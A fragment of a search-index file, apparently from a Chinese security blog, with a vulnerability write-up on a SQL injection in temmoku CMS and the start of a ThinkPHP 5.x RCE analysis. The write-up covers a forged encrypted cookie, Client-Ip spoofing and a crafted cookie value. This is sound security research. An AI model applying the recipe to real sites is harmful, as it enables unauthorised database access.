\u5bf9   CommonsCollections   \u7cfb\u5217 \u7684 \u5229\u7528 \u94fe \u8fdb\u884c \u5206\u6790 \u540e \uff0c \u5728 shiro \u8fd9\u4e2a \u95ee\u9898 \u4e0a \uff0c \u8fdb\u884c \u4e86 \u5b9e\u6218 \uff0c \u89e3\u51b3 \u4e86 tomcat \u4e0b \u65e0\u6cd5 \u5229\u7528 shiro \u539f\u751f \u7684   commons - collections : 3.2 . 1   \u8fd9\u4e2a \u95ee\u9898 \u3002   \u6700\u540e \uff0c \u5728 \u6700\u8fd1 \u7684   shiro - 721   \u5229\u7528 \u4e0a \uff0c \u8fd9\u4e2a \u5229\u7528 \u94fe \u5e0c\u671b \u53ef\u4ee5 \u5e2e\u52a9 \u5230 \u5927\u5bb6   Happy   Hacking   XD","title":"0x05   \u603b\u7ed3"},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"0x00   \u5f88\u4e45 \u5f88\u4e45\u6ca1 \u6709 \u5ba1\u8ba1 \u4e86 \uff0c \u627e \u4e86 \u4e2a \u7b80\u5355 \u7684 cms \u5ba1\u8ba1   \u8fd9\u6b21 \u627e \u7684 \u662f temmoku \uff0c \u4ed6 \u4fee\u6539 \u4e86 thinkphp \u4f5c\u4e3a \u4ed6 \u7684 \u5e95\u5c42 \u6846\u67b6 \u3002   \u4ee3\u7801 \u5199 \u7684 \u5f88 \u96be\u53d7 \uff0c \u5199 \u51fa\u6765 \u7684 \u754c\u9762 \u4e5f \u5f88 \u96be\u53d7 \uff0c \u6240\u4ee5 \u627e \u4e86 \u4e2a \u6ce8\u5165 \u5c31 \u4e0d\u60f3 \u770b \u4e86 \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u3002   0x01   \u524d\u53f0 \u6ce8\u5165   \u8fd9\u5957 cms \uff0c \u6bcf\u4e2a \u63a7\u5236 \u63a7\u5236\u5668 \u90fd \u7ee7\u627f \u4e86   temmoku / controller . php   \uff0c \u5176\u4e2d controller \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u505a \u4e86 \u76f8\u5173 \u6743\u9650 \u63a7\u5236   \u627e\u5230   temmoku / controller . php   \uff0c \u5b9a\u4f4d \u5230 __ construct \u51fd\u6570   function   __ construct ( )   {   $ this - > _ view   =   new   view ( ) ;   if ( ! cookie : : get ( ' USER _ First _ Visit ' ) ) {   cookie : : set ( ' USER _ First _ Visit ' , $ _ SERVER [ ' REQUEST _ TIME _ FLOAT ' ] ) ;   }   $ lock = APP _ PATH . ' conf / install . lock ' ;   if ( is _ file ( $ lock ) ) {   if ( ' admin ' ! = MODULE   &&   ' user ' ! = MODULE ) {   hook _ listen ( ' index _ power _ begin ' ) ;   }   / / \u9a8c\u8bc1 \u666e\u901a \u4f1a\u5458 \u72b6\u6001   $ this - > User _ Check ( ) ; / /   \u6ce8\u5165   if ( ' admin ' ! = MODULE   &&   ' user ' ! = MODULE ) {   hook _ listen ( ' index _ power _ end ' ) ;   }   }   }   \u6ce8\u610f \u5230 \u7b2c 13 \u884c \uff0c \u8c03\u7528 \u4e86 User _ Check \u51fd\u6570 \uff0c \u8fd9\u4e2a \u51fd\u6570 \u5b8c\u6210 \u4e86 \u4ece cookie \u4e2d \u83b7\u53d6 \u5230 \u767b\u9646 \u540e \u7684 \u52a0\u5bc6 \u5b57\u4e32 \uff0c \u89e3\u5bc6 \u540e \u518d \u67e5\u8be2 \u7684 \u64cd\u4f5c \u3002   private   function   User _ Check ( ) {   $ ORDINARY _ MEMBER = cookie : : get ( ' ORDINARY _ MEMBER ' ) ;   if ( $ ORDINARY _ MEMBER ) {   if ( json _ encode ( $ ORDINARY _ MEMBER ) ) {   $ ORDINARY _ MEMBER = decode ( $ ORDINARY _ MEMBER ) ;   list ( $ uid , $ password , $ onlineip ) = $ r   = explode ( '   ' , $ ORDINARY _ MEMBER ) ;   if ( ! intval ( $ uid )   | |   ! $ password   | |   C ( ' ONLINEIP ' )   ! =   $ onlineip   | |   ! $ onlineip ) {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   $ data   =   ( new   lib \\ user ) - > Cookie _ Login ( $ uid , $ password ) ; / /   TODO   \u4f2a\u9020 cookie   \u5bf9 password \u505a \u6570\u636e \u6ce8\u5165   if ( ' 0 ' = = = $ data [ ' code ' ] ) {   $ data [ ' UserDB ' ] [ ' thumb ' ]   ?   $ data [ ' UserDB ' ] [ ' thumb ' ] = get _ img _ url ( $ data [ ' UserDB ' ] [ ' thumb ' ] )   :   $ data [ ' UserDB ' ] [ ' thumb ' ] = ' / public / global / images / default . png ' ;   C ( ' MYDB ' , $ data [ ' UserDB ' ] ) ;   $ group = C ( ' USER _ GROUP . ' . $ data [ ' UserDB ' ] [ ' groupid ' ] ) ;   $ group [ ' setting ' ] = unserialize ( $ group [ ' setting ' ] ) ;   C ( ' MYGROUP ' , $ group ) ;   } else {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   } else {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   }   }   \u4ece cookie \u4e2d \u83b7\u5f97 ORDINARY _ MEMBER \u76f8\u5173 \u7684 cookie \u5185\u5bb9 \uff0c \u5e76 \u4ea4\u7531 decode \u89e3\u5bc6 \uff0c \u89e3\u5bc6 \u51fa uid , password , onlineip \uff0c \u76f4\u63a5 \u5e26\u5165 \u5230 Cookie _ Login \u51fd\u6570 \uff0c \u6211\u4eec \u5148 \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u51fd\u6570 \uff0c \u7b49 \u4f1a \u518d \u8bb2 \u5982\u4f55 \u6784\u9020 \u52a0\u5bc6 \u4e32   public   function   Cookie _ Login ( $ uid , $ password ) {   $ UserDB = $ this - > select ( ' * ' ) - > from ( jab . \" user \" ) - > where ( \" uid = ' $ uid '   AND   password = ' $ password ' \" ) - > row ( ) ;   if ( $ UserDB ) {   return   array ( \" code \" = > ' 0 ' , ' text ' = > \" \u767b\u5f55 \u6210\u529f \" , ' UserDB ' = > $ UserDB ) ;   } else {   return   array ( \" code \" = > ' 21 ' , ' text ' = > \" \u5bc6\u7801 \u9519\u8bef \" ) ;   }   }   \u53ef\u4ee5 \u770b\u5230 \u51fd\u6570 \u5185 \u7b2c\u4e00 \u4e00\u53e5 \u7b2c\u4e00\u53e5 \uff0c \u8fdb\u884c \u4e86 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \uff0c \u719f\u6089 thinkphp \u7684 \u540c\u5b66 \u80af\u5b9a \u77e5\u9053 where \u51fd\u6570 \u62fc\u63a5 \u53c2\u6570 \u540c\u6837 \u80fd \u9020\u6210 \u6ce8\u5165 \uff0c \u90a3\u4e48 \u95ee\u9898 \u5c31\u662f \u5982\u4f55 \u6784\u9020 \u51fa password \u6765 \u8fdb\u884c \u6ce8\u5165 \u4e86 \uff0c \u56de\u5230 \u4e0a\u9762 \u63d0\u5230 \u7684 decode \u51fd\u6570 \uff0c \u6765\u770b \u4e00\u4e0b \u51fd\u6570 \u5185\u5bb9   / * *   *   \u89e3\u5bc6 \u51fd\u6570   *   @ param   string   $ txt   \u9700\u8981 \u89e3\u5bc6 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32   *   @ param   string   $ key   \u5bc6\u5319   *   @ return   string   \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u7684 \u8fd4\u56de \u7ed3\u679c   * /   function   decode ( $ txt ,   $ key   =   ' ' ,   $ ttl   =   0 ) {   if   ( empty ( $ txt ) )   return   $ txt ;   if   ( empty ( $ key ) )   $ key   =   md5 ( C ( ' MD5 ' ) ) ;   / /   ...   \u540e\u9762 \u7684 \u76f8\u5173 \u6570\u5b66 \u64cd\u4f5c \u65e0\u5173 \u5173\u7d27 \u7d27\u8981 \u65e0\u5173\u7d27\u8981   }   \u6ce8\u610f \u5230 \u5728 User _ Check \u51fd\u6570 \u91cc \u8c03\u7528 decode \u65f6 \uff0c \u5e76 \u6ca1\u6709 \u6307\u5b9a key \uff0c \u90a3\u4e48 \u9ed8\u8ba4 \u5c31\u662f \u53d6 \u914d\u7f6e \u6587\u4ef6 \u914d\u7f6e\u6587\u4ef6 \u4e2d \u7684 MD5 \uff0c \u5176\u503c \u9ed8\u8ba4 \u4e3a\u7a7a \uff0c \u6240\u4ee5 \u77e5\u9053 \u4e86 key \u4ee5\u53ca \u5bf9\u5e94 \u7684 \u52a0\u5bc6 \u51fd\u6570 \uff0c \u6211\u4eec \u5c31 \u80fd \u81ea\u5df1 \u6784\u9020 \u76f8\u5173 \u5185\u5bb9 \u3002   \u5176\u4e2d \u8fd8\u6709 \u4e00\u4e2a \u8981 \u6ce8\u610f \u7684 \u5730\u65b9 \u662f \uff0c \u6211\u4eec \u9700\u8981 \u540c\u65f6 \u6784\u9020 cookie \u7684 \u952e \u5185\u5bb9 \u548c onlineip \uff0c \u53ea\u6709 \u5f53 cookie \u4e2d \u540d\u5b57 \u5bf9\u65f6 \u624d\u80fd \u53d6 \u5230 \uff0c \u53ea\u6709 \u5f53 onlineip \u5bf9\u65f6 \u624d\u80fd \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002   \u5148 \u6765\u770b \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \uff0c \u6784\u9020 cookie \u540d   \u5b9a\u4f4d   temmoku / lib / cookie . php   public   static   function   get ( $ key ) {   $ key = C ( ' cookie _ is _ en ' ) = = ' 1 '   ?   ' temmoku _ ' . md5 ( C ( ' MD5 ' ) . \" _ \" . $ key )   :   ' temmoku _ ' . $ key ;   return   empty ( $ _ COOKIE [ $ key ] )   ?   0   :   $ _ COOKIE [ $ key ] ;   }   \u9ed8\u8ba4 cookie _ is _ en \u4e3a 1 \uff0c \u6240\u4ee5 \u662f \u52a0\u5bc6 \u7684 \uff0c cookie \u7684 \u540d\u5b57 \u4e3a   temmoku _+ md5 ( \" _ ORDINARY _ MEMBER \" )   \u56e0\u4e3a MD5 \u9ed8\u8ba4 \u4e3a\u7a7a \uff0c \u8fd9\u6837 \u6211\u4eec \u5c31 \u80fd \u63a8\u51fa cookie \u540d\u4e3a   temmoku _ c3daef9b5af4ca25121457287fd0c2ac   \u5176\u6b21 \u6211\u4eec \u9700\u8981 \u6784\u9020 onlineip , \u6765 \u770b\u770b \u8fd9\u4e2a onlineip \u662f \u600e\u4e48 \u83b7\u53d6 \u7684   \u5b9a\u4f4d   temmoku / app . php   private   static   function   default _ config ( ) {   / /   ...   C ( ' onlineip ' , getRealIp ( ) ) ; / /   TODO   \u53ef \u4f2a\u9020 Ip   define ( ' onlineip ' ,   getRealIp ( ) ) ;   / /   ...   }   \u7ee7\u7eed \u5411\u4e0b   function   getRealIp ( ) {   $ ip = false ;   if ( ! empty ( $ _ SERVER [ \" HTTP _ CLIENT _ IP \" ] ) ) {   $ ip   =   $ _ SERVER [ \" HTTP _ CLIENT _ IP \" ] ;   }   if   ( ! empty ( $ _ SERVER [ ' HTTP _ X _ FORWARDED _ FOR ' ] ) )   {   $ ips   =   explode   ( \" ,   \" ,   $ _ SERVER [ ' HTTP _ X _ FORWARDED _ FOR ' ] ) ;   if   ( $ ip )   {   array _ unshift ( $ ips ,   $ ip ) ;   $ ip   =   FALSE ;   }   for   ( $ i   =   0 ;   $ i   <   count ( $ ips ) ;   $ i ++ )   {   if   ( ! preg _ match   ( \" / ^ ( 10 \u2502 172.16 \u2502 192.168 ) . / \" ,   $ ips [ $ i ] ) )   {   $ ip   =   $ ips [ $ i ] ;   break ;   }   }   }   return   ( $ ip   ?   $ ip   :   $ _ SERVER [ ' REMOTE _ ADDR ' ] ) ;   }   \u53ef\u4ee5 \u770b\u51fa \u7528 Client - Ip \u5c31 \u80fd \u4f2a\u9020 \uff0c \u90a3\u4e48 \u73b0\u5728 \u95ee\u9898 \u90fd \u89e3\u51b3 \u4e86 \uff0c \u53ef\u4ee5 \u6784\u9020 \u52a0\u5bc6 \u4e32 \u4e86   0x02   \u6784\u9020 \u52a0\u5bc6 \u4e32   < ? php   / * *   *   Created   by   PhpStorm .   *   User :   wh1t3P1g   *   Date :   2019 / 2 / 21   *   Time :   19 : 48   * /   function   decode   (   $ txt   ,   $ key   =   ' '   ,   $ ttl   =   0   ) {   ...   }   function   encode   (   $ txt   ,   $ key   =   ' '   ) {   ...   }   echo   encode   (   ' 1550750916.778   \\ '   127.0 . 0.1 '   ) ;   \u5f97\u5230 \u52a0\u5bc6 \u4e32   iBuikbGflt4lk4LiZ747G7NBIm9uPlLKikooVtsqagnfQIk1NZI0 - rW   \uff0c \u76f4\u63a5 \u52a0\u5728 cookie \u91cc \u5c31 \u80fd \u9020\u6210 \u7cfb\u7edf \u51fa\u73b0 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u9519\u8bef   0x03   \u603b\u7ed3   \u8fd9\u4e2a \u6f0f\u6d1e \u662f \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u95ee\u9898 \uff0c \u7528 \u4e86 \u52a0\u5bc6 \u540e \uff0c \u5f00\u53d1 \u5f00\u53d1\u8005 \u9ed8\u8ba4 \u8ba4\u4e3a \u89e3\u5bc6 \u540e \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u662f \u5b89\u5168 \u7684 \uff0c \u76f4\u63a5 \u62fc\u63a5 \u5230 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \u4e0a \u5bfc\u81f4 \u7684 \u6ce8\u5165 \u3002","title":"temmoku   home \u7248   t1.15   \u524d\u53f0 sqli"},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x00","text":"\u5f88\u4e45 \u5f88\u4e45\u6ca1 \u6709 \u5ba1\u8ba1 \u4e86 \uff0c \u627e \u4e86 \u4e2a \u7b80\u5355 \u7684 cms \u5ba1\u8ba1   \u8fd9\u6b21 \u627e \u7684 \u662f temmoku \uff0c \u4ed6 \u4fee\u6539 \u4e86 thinkphp \u4f5c\u4e3a \u4ed6 \u7684 \u5e95\u5c42 \u6846\u67b6 \u3002   \u4ee3\u7801 \u5199 \u7684 \u5f88 \u96be\u53d7 \uff0c \u5199 \u51fa\u6765 \u7684 \u754c\u9762 \u4e5f \u5f88 \u96be\u53d7 \uff0c \u6240\u4ee5 \u627e \u4e86 \u4e2a \u6ce8\u5165 \u5c31 \u4e0d\u60f3 \u770b \u4e86 \uff0c \u8bb0\u5f55 \u4e00\u4e0b \u3002","title":"0x00"},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x01","text":"\u8fd9\u5957 cms \uff0c \u6bcf\u4e2a \u63a7\u5236 \u63a7\u5236\u5668 \u90fd \u7ee7\u627f \u4e86   temmoku / controller . php   \uff0c \u5176\u4e2d controller \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u505a \u4e86 \u76f8\u5173 \u6743\u9650 \u63a7\u5236   \u627e\u5230   temmoku / controller . php   \uff0c \u5b9a\u4f4d \u5230 __ construct \u51fd\u6570   function   __ construct ( )   {   $ this - > _ view   =   new   view ( ) ;   if ( ! cookie : : get ( ' USER _ First _ Visit ' ) ) {   cookie : : set ( ' USER _ First _ Visit ' , $ _ SERVER [ ' REQUEST _ TIME _ FLOAT ' ] ) ;   }   $ lock = APP _ PATH . ' conf / install . lock ' ;   if ( is _ file ( $ lock ) ) {   if ( ' admin ' ! = MODULE   &&   ' user ' ! = MODULE ) {   hook _ listen ( ' index _ power _ begin ' ) ;   }   / / \u9a8c\u8bc1 \u666e\u901a \u4f1a\u5458 \u72b6\u6001   $ this - > User _ Check ( ) ; / /   \u6ce8\u5165   if ( ' admin ' ! = MODULE   &&   ' user ' ! = MODULE ) {   hook _ listen ( ' index _ power _ end ' ) ;   }   }   }   \u6ce8\u610f \u5230 \u7b2c 13 \u884c \uff0c \u8c03\u7528 \u4e86 User _ Check \u51fd\u6570 \uff0c \u8fd9\u4e2a \u51fd\u6570 \u5b8c\u6210 \u4e86 \u4ece cookie \u4e2d \u83b7\u53d6 \u5230 \u767b\u9646 \u540e \u7684 \u52a0\u5bc6 \u5b57\u4e32 \uff0c \u89e3\u5bc6 \u540e \u518d \u67e5\u8be2 \u7684 \u64cd\u4f5c \u3002   private   function   User _ Check ( ) {   $ ORDINARY _ MEMBER = cookie : : get ( ' ORDINARY _ MEMBER ' ) ;   if ( $ ORDINARY _ MEMBER ) {   if ( json _ encode ( $ ORDINARY _ MEMBER ) ) {   $ ORDINARY _ MEMBER = decode ( $ ORDINARY _ MEMBER ) ;   list ( $ uid , $ password , $ onlineip ) = $ r   = explode ( '   ' , $ ORDINARY _ MEMBER ) ;   if ( ! intval ( $ uid )   | |   ! $ password   | |   C ( ' ONLINEIP ' )   ! =   $ onlineip   | |   ! $ onlineip ) {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   $ data   =   ( new   lib \\ user ) - > Cookie _ Login ( $ uid , $ password ) ; / /   TODO   \u4f2a\u9020 cookie   \u5bf9 password \u505a \u6570\u636e \u6ce8\u5165   if ( ' 0 ' = = = $ data [ ' code ' ] ) {   $ data [ ' UserDB ' ] [ ' thumb ' ]   ?   $ data [ ' UserDB ' ] [ ' thumb ' ] = get _ img _ url ( $ data [ ' UserDB ' ] [ ' thumb ' ] )   :   $ data [ ' UserDB ' ] [ ' thumb ' ] = ' / public / global / images / default . png ' ;   C ( ' MYDB ' , $ data [ ' UserDB ' ] ) ;   $ group = C ( ' USER _ GROUP . ' . $ data [ ' UserDB ' ] [ ' groupid ' ] ) ;   $ group [ ' setting ' ] = unserialize ( $ group [ ' setting ' ] ) ;   C ( ' MYGROUP ' , $ group ) ;   } else {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   } else {   cookie : : del ( ' ORDINARY _ MEMBER ' ) ;   return ;   }   }   }   \u4ece cookie \u4e2d \u83b7\u5f97 ORDINARY _ MEMBER \u76f8\u5173 \u7684 cookie \u5185\u5bb9 \uff0c \u5e76 \u4ea4\u7531 decode \u89e3\u5bc6 \uff0c \u89e3\u5bc6 \u51fa uid , password , onlineip \uff0c \u76f4\u63a5 \u5e26\u5165 \u5230 Cookie _ Login \u51fd\u6570 \uff0c \u6211\u4eec \u5148 \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u51fd\u6570 \uff0c \u7b49 \u4f1a \u518d \u8bb2 \u5982\u4f55 \u6784\u9020 \u52a0\u5bc6 \u4e32   public   function   Cookie _ Login ( $ uid , $ password ) {   $ UserDB = $ this - > select ( ' * ' ) - > from ( jab . \" user \" ) - > where ( \" uid = ' $ uid '   AND   password = ' $ password ' \" ) - > row ( ) ;   if ( $ UserDB ) {   return   array ( \" code \" = > ' 0 ' , ' text ' = > \" \u767b\u5f55 \u6210\u529f \" , ' UserDB ' = > $ UserDB ) ;   } else {   return   array ( \" code \" = > ' 21 ' , ' text ' = > \" \u5bc6\u7801 \u9519\u8bef \" ) ;   }   }   \u53ef\u4ee5 \u770b\u5230 \u51fd\u6570 \u5185 \u7b2c\u4e00 \u4e00\u53e5 \u7b2c\u4e00\u53e5 \uff0c \u8fdb\u884c \u4e86 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \uff0c \u719f\u6089 thinkphp \u7684 \u540c\u5b66 \u80af\u5b9a \u77e5\u9053 where \u51fd\u6570 \u62fc\u63a5 \u53c2\u6570 \u540c\u6837 \u80fd \u9020\u6210 \u6ce8\u5165 \uff0c \u90a3\u4e48 \u95ee\u9898 \u5c31\u662f \u5982\u4f55 \u6784\u9020 \u51fa password \u6765 \u8fdb\u884c \u6ce8\u5165 \u4e86 \uff0c \u56de\u5230 \u4e0a\u9762 \u63d0\u5230 \u7684 decode \u51fd\u6570 \uff0c \u6765\u770b \u4e00\u4e0b \u51fd\u6570 \u5185\u5bb9   / * *   *   \u89e3\u5bc6 \u51fd\u6570   *   @ param   string   $ txt   \u9700\u8981 \u89e3\u5bc6 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32   *   @ param   string   $ key   \u5bc6\u5319   *   @ return   string   \u5b57\u7b26 \u5b57\u7b26\u4e32 \u7c7b\u578b \u7684 \u8fd4\u56de \u7ed3\u679c   * /   function   decode ( $ txt ,   $ key   =   ' ' ,   $ ttl   =   0 ) {   if   ( empty ( $ txt ) )   return   $ txt ;   if   ( empty ( $ key ) )   $ key   =   md5 ( C ( ' MD5 ' ) ) ;   / /   ...   \u540e\u9762 \u7684 \u76f8\u5173 \u6570\u5b66 \u64cd\u4f5c \u65e0\u5173 \u5173\u7d27 \u7d27\u8981 \u65e0\u5173\u7d27\u8981   }   \u6ce8\u610f \u5230 \u5728 User _ Check \u51fd\u6570 \u91cc \u8c03\u7528 decode \u65f6 \uff0c \u5e76 \u6ca1\u6709 \u6307\u5b9a key \uff0c \u90a3\u4e48 \u9ed8\u8ba4 \u5c31\u662f \u53d6 \u914d\u7f6e \u6587\u4ef6 \u914d\u7f6e\u6587\u4ef6 \u4e2d \u7684 MD5 \uff0c \u5176\u503c \u9ed8\u8ba4 \u4e3a\u7a7a \uff0c \u6240\u4ee5 \u77e5\u9053 \u4e86 key \u4ee5\u53ca \u5bf9\u5e94 \u7684 \u52a0\u5bc6 \u51fd\u6570 \uff0c \u6211\u4eec \u5c31 \u80fd \u81ea\u5df1 \u6784\u9020 \u76f8\u5173 \u5185\u5bb9 \u3002   \u5176\u4e2d \u8fd8\u6709 \u4e00\u4e2a \u8981 \u6ce8\u610f \u7684 \u5730\u65b9 \u662f \uff0c \u6211\u4eec \u9700\u8981 \u540c\u65f6 \u6784\u9020 cookie \u7684 \u952e \u5185\u5bb9 \u548c onlineip \uff0c \u53ea\u6709 \u5f53 cookie \u4e2d \u540d\u5b57 \u5bf9\u65f6 \u624d\u80fd \u53d6 \u5230 \uff0c \u53ea\u6709 \u5f53 onlineip \u5bf9\u65f6 \u624d\u80fd \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u3002   \u5148 \u6765\u770b \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \uff0c \u6784\u9020 cookie \u540d   \u5b9a\u4f4d   temmoku / lib / cookie . php   public   static   function   get ( $ key ) {   $ key = C ( ' cookie _ is _ en ' ) = = ' 1 '   ?   ' temmoku _ ' . md5 ( C ( ' MD5 ' ) . \" _ \" . $ key )   :   ' temmoku _ ' . $ key ;   return   empty ( $ _ COOKIE [ $ key ] )   ?   0   :   $ _ COOKIE [ $ key ] ;   }   \u9ed8\u8ba4 cookie _ is _ en \u4e3a 1 \uff0c \u6240\u4ee5 \u662f \u52a0\u5bc6 \u7684 \uff0c cookie \u7684 \u540d\u5b57 \u4e3a   temmoku _+ md5 ( \" _ ORDINARY _ MEMBER \" )   \u56e0\u4e3a MD5 \u9ed8\u8ba4 \u4e3a\u7a7a \uff0c \u8fd9\u6837 \u6211\u4eec \u5c31 \u80fd \u63a8\u51fa cookie \u540d\u4e3a   temmoku _ c3daef9b5af4ca25121457287fd0c2ac   \u5176\u6b21 \u6211\u4eec \u9700\u8981 \u6784\u9020 onlineip , \u6765 \u770b\u770b \u8fd9\u4e2a onlineip \u662f \u600e\u4e48 \u83b7\u53d6 \u7684   \u5b9a\u4f4d   temmoku / app . php   private   static   function   default _ config ( ) {   / /   ...   C ( ' onlineip ' , getRealIp ( ) ) ; / /   TODO   \u53ef \u4f2a\u9020 Ip   define ( ' onlineip ' ,   getRealIp ( ) ) ;   / /   ...   }   \u7ee7\u7eed \u5411\u4e0b   function   getRealIp ( ) {   $ ip = false ;   if ( ! empty ( $ _ SERVER [ \" HTTP _ CLIENT _ IP \" ] ) ) {   $ ip   =   $ _ SERVER [ \" HTTP _ CLIENT _ IP \" ] ;   }   if   ( ! empty ( $ _ SERVER [ ' HTTP _ X _ FORWARDED _ FOR ' ] ) )   {   $ ips   =   explode   ( \" ,   \" ,   $ _ SERVER [ ' HTTP _ X _ FORWARDED _ FOR ' ] ) ;   if   ( $ ip )   {   array _ unshift ( $ ips ,   $ ip ) ;   $ ip   =   FALSE ;   }   for   ( $ i   =   0 ;   $ i   <   count ( $ ips ) ;   $ i ++ )   {   if   ( ! preg _ match   ( \" / ^ ( 10 \u2502 172.16 \u2502 192.168 ) . / \" ,   $ ips [ $ i ] ) )   {   $ ip   =   $ ips [ $ i ] ;   break ;   }   }   }   return   ( $ ip   ?   $ ip   :   $ _ SERVER [ ' REMOTE _ ADDR ' ] ) ;   }   \u53ef\u4ee5 \u770b\u51fa \u7528 Client - Ip \u5c31 \u80fd \u4f2a\u9020 \uff0c \u90a3\u4e48 \u73b0\u5728 \u95ee\u9898 \u90fd \u89e3\u51b3 \u4e86 \uff0c \u53ef\u4ee5 \u6784\u9020 \u52a0\u5bc6 \u4e32 \u4e86","title":"0x01   \u524d\u53f0 \u6ce8\u5165"},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x02","text":"< ? php   / * *   *   Created   by   PhpStorm .   *   User :   wh1t3P1g   *   Date :   2019 / 2 / 21   *   Time :   19 : 48   * /   function   decode   (   $ txt   ,   $ key   =   ' '   ,   $ ttl   =   0   ) {   ...   }   function   encode   (   $ txt   ,   $ key   =   ' '   ) {   ...   }   echo   encode   (   ' 1550750916.778   \\ '   127.0 . 0.1 '   ) ;   \u5f97\u5230 \u52a0\u5bc6 \u4e32   iBuikbGflt4lk4LiZ747G7NBIm9uPlLKikooVtsqagnfQIk1NZI0 - rW   \uff0c \u76f4\u63a5 \u52a0\u5728 cookie \u91cc \u5c31 \u80fd \u9020\u6210 \u7cfb\u7edf \u51fa\u73b0 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u9519\u8bef","title":"0x02   \u6784\u9020 \u52a0\u5bc6 \u4e32"},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x03","text":"\u8fd9\u4e2a \u6f0f\u6d1e \u662f \u6bd4\u8f83 \u7ecf\u5178 \u7684 \u95ee\u9898 \uff0c \u7528 \u4e86 \u52a0\u5bc6 \u540e \uff0c \u5f00\u53d1 \u5f00\u53d1\u8005 \u9ed8\u8ba4 \u8ba4\u4e3a \u89e3\u5bc6 \u540e \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u662f \u5b89\u5168 \u7684 \uff0c \u76f4\u63a5 \u62fc\u63a5 \u5230 \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u64cd\u4f5c \u4e0a \u5bfc\u81f4 \u7684 \u6ce8\u5165 \u3002","title":"0x03   \u603b\u7ed3"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"\u6982\u8ff0   \u653e\u5047 \u4e86 \uff0c \u5bf9 thinkphp \u7684 \u51e0\u4e2a RCE \u505a \u4e00\u4e0b \u5206\u6790 \uff0c \u8bb0\u5f55 \u4e00\u4e0b XD   thinkphp   v5.0 . x   \u6f0f\u6d1e \u76f8\u5173 \u4fe1\u606f   \u6f0f\u6d1e \u7248\u672c \uff1a < =   5.0 . 22   \u8865\u4e01 \uff1a   \u7248\u672c \u66f4\u65b0   \u00b7   top - think / framework @ 4cbc0b5   \u00b7   GitHub   \u95ee\u9898 \u70b9 \uff1a library / think / App . php   \u6f0f\u6d1e \u5206\u6790   \u5173\u4e8e thinkphp \u7684 url \u89e3\u6790 \u65b9\u5f0f   THINKPHP \u652f\u6301 \u4f7f\u7528 PATHINFO \u7684 \u65b9\u5f0f \u6765 \u8bbf\u95ee \u5177\u4f53 \u7684 \u6a21\u5757 \u3001 \u7c7b \u3001 \u65b9\u6cd5 \uff0c \u5982   index . php / module / controller / action   \u5bf9\u4e8e \u4e0d \u652f\u6301 PATHINFO \u7684 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \uff0c THINKPHP \u63d0\u4f9b \u4e86 \u517c\u5bb9 \u6a21\u5f0f   ? s = / module / controller / action   \u7684 \u65b9\u5f0f \u6765 \u8bbf\u95ee   \u800c \u8fd9\u6b21 \u7684 \u6f0f\u6d1e \u6210\u56e0 \u5c31\u662f \u5728\u4e8e \u517c\u5bb9 \u6a21\u5f0f \u5904\u7406 \u65f6 \u5b58\u5728 \u7684 \u95ee\u9898 \u3002   \u9996\u5148 \u770b   thinkphp / library / think / Request . php   \u7684   pathinfo   \u51fd\u6570   public   function   pathinfo ( )   {   if   ( is _ null ( $ this - > pathinfo ) )   {   if   ( isset ( $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ) )   {   / /   \u5224\u65ad URL \u91cc\u9762 \u662f\u5426 \u6709 \u517c\u5bb9 \u6a21\u5f0f \u53c2\u6570   $ _ SERVER [ ' PATH _ INFO ' ]   =   $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ;   unset ( $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ) ;   }   elseif   ( IS _ CLI )   {   / /   CLI \u6a21\u5f0f \u4e0b   index . php   module / controller / action / params / ...   $ _ SERVER [ ' PATH _ INFO ' ]   =   isset ( $ _ SERVER [ ' argv ' ] [ 1 ] )   ?   $ _ SERVER [ ' argv ' ] [ 1 ]   :   ' ' ;   }   / /   \u5206\u6790 PATHINFO \u4fe1\u606f   ...   $ this - > pathinfo   =   empty ( $ _ SERVER [ ' PATH _ INFO ' ] )   ?   ' / '   :   ltrim ( $ _ SERVER [ ' PATH _ INFO ' ] ,   ' / ' ) ;   }   return   $ this - > pathinfo ;   }   \u5f53 GET \u8bf7\u6c42 \u4e2d \u5e26\u6709 s \u53c2\u6570 ( config \u4e2d \u9ed8\u8ba4 